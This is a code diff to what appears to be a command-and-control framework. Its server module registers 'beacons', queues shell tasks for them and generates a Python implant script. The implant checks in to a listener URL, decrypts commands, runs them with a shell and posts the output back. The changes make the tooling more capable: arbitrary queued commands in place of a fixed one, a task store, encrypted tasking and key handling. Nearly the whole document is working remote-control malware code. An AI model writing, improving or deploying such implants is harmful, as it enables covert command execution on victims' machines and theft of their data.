@@ -5,9 +5,11 @@ import base64
 import os
 import threading
 
+from core.runtime_secrets import get_or_create_fernet_key
+
 try:
     from cryptography.fernet import Fernet
-    BEACON_KEY = Fernet.generate_key()
+    BEACON_KEY = get_or_create_fernet_key().encode("ascii")
     BEACON_CIPHER = Fernet(BEACON_KEY)
     CRYPTO_AVAILABLE = True
 except ImportError:
@@ -19,6 +21,7 @@ except ImportError:
 BEACONS = {}
 BEACON_LOCK = threading.Lock()
 BEACON_TASKS = {}
+BEACON_TASKS_STORE = {}
 
 
 def register_beacon(beacon_data):
@@ -42,6 +45,7 @@ def register_beacon(beacon_data):
             "results": []
         }
         BEACON_TASKS[beacon_id] = []
+        BEACON_TASKS_STORE[beacon_id] = {}
 
     try:
         from handlers.team_server import notify_beacon_checkin
@@ -86,14 +90,26 @@ def beacon_checkin(beacon_id, encrypted_data):
             })
             if data.get("task_id") in BEACON_TASKS.get(beacon_id, []):
                 BEACON_TASKS[beacon_id].remove(data["task_id"])
+                completed_task = BEACON_TASKS_STORE.get(beacon_id, {}).pop(data["task_id"], None)
+                if completed_task:
+                    completed_task["status"] = "completed"
 
-    pending = []
     with BEACON_LOCK:
         pending = list(BEACON_TASKS.get(beacon_id, [])[:5])
+        pending_tasks = [
+            dict(BEACON_TASKS_STORE.get(beacon_id, {}).get(task_id, {}))
+            for task_id in pending
+        ]
 
     response = {"status": "ok", "tasks": []}
-    if pending:
-        response["tasks"] = [{"task_id": t, "command": "system_info"} for t in pending]
+    response["tasks"] = [
+        {
+            "task_id": task_id,
+            "command": task.get("command", "system_info"),
+            "type": task.get("type", "shell"),
+        }
+        for task_id, task in zip(pending, pending_tasks)
+    ]
 
     try:
         encrypted_response = BEACON_CIPHER.encrypt(json.dumps(response).encode())
@@ -122,6 +138,9 @@ def assign_task(beacon_id, command, task_type="shell"):
             "issued_at": time.time(),
             "status": "pending"
         }
+        if beacon_id not in BEACON_TASKS_STORE:
+            BEACON_TASKS_STORE[beacon_id] = {}
+        BEACON_TASKS_STORE[beacon_id][task_id] = task
         if "tasks" not in BEACONS[beacon_id]:
             BEACONS[beacon_id]["tasks"] = []
         BEACONS[beacon_id]["tasks"].append(task)
@@ -176,29 +195,26 @@ def remove_beacon(beacon_id):
     with BEACON_LOCK:
         BEACONS.pop(beacon_id, None)
         BEACON_TASKS.pop(beacon_id, None)
+        BEACON_TASKS_STORE.pop(beacon_id, None)
     return {"status": "success"}
 
 
 def generate_beacon_script(listener_url, sleep_sec=5, jitter_pct=30):
-    # FIX: Read BEACON_API_KEY from env to match beacon_routes.py authentication
-    beacon_api_key = os.environ.get('BEACON_API_KEY', 'YGG-BEACON-KEY-SECRET')
+    beacon_api_key = os.environ.get('BEACON_API_KEY')
+    if not beacon_api_key:
+        raise RuntimeError("BEACON_API_KEY is required to generate a beacon script.")
+    listener_literal = json.dumps(listener_url)
+    api_key_literal = json.dumps(beacon_api_key)
     script = f'''
-import json, time, base64, uuid, platform, socket, os, subprocess, sys, random, shlex
-try:
-    from cryptography.fernet import Fernet
-except ImportError:
-    import urllib.request, zipfile, io, tempfile
-    tmp = tempfile.mkdtemp()
-    urllib.request.urlretrieve("https://files.pythonhosted.org/packages/cryptography/cryptography-41.0.7-cp37-abi3-win_amd64.whl", tmp + "/crypto.whl")
-    sys.path.insert(0, tmp + "/crypto.whl")
-    from cryptography.fernet import Fernet
+import json, time, base64, platform, socket, os, subprocess, random
+from cryptography.fernet import Fernet
 
 BEACON_ID = None
-LISTENER = "{listener_url}"
+LISTENER = {listener_literal}
 SLEEP = {sleep_sec}
 JITTER = {jitter_pct}
 KEY = Fernet(base64.b64decode("{base64.b64encode(BEACON_KEY).decode()}"))
-API_KEY = "{beacon_api_key}"
+API_KEY = {api_key_literal}
 
 
 def encrypt(data):
@@ -239,7 +255,7 @@ def checkin():
         req = urllib.request.Request(LISTENER + "/checkin/" + BEACON_ID, data=enc.encode(), headers={{"Content-Type": "application/octet-stream", "X-Beacon-Key": API_KEY}})
         resp = json.loads(urllib.request.urlopen(req).read())
         if resp.get("status") == "success" and resp.get("response"):
-            tasks = json.loads(base64.b64decode(resp["response"]).decode())
+            tasks = decrypt(base64.b64decode(resp["response"]).decode())
             for t in tasks.get("tasks", []):
                 try:
                     # FIX: Use shell=True or OS-specific check to allow built-in commands (dir, type, pipe)
@@ -252,7 +268,7 @@ def checkin():
                     else:
                         if isinstance(cmd, list):
                             cmd = " ".join(cmd)
-                        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors="replace")
+                        result = subprocess.check_output(["/bin/sh", "-c", cmd], shell=False, stderr=subprocess.STDOUT, timeout=30).decode(errors="replace")
                     payload2 = {{"task_id": t["task_id"], "result": result}}
                     enc2 = encrypt(payload2)
                     req2 = urllib.request.Request(LISTENER + "/checkin/" + BEACON_ID, data=enc2.encode(), headers={{"Content-Type": "application/octet-stream", "X-Beacon-Key": API_KEY}})
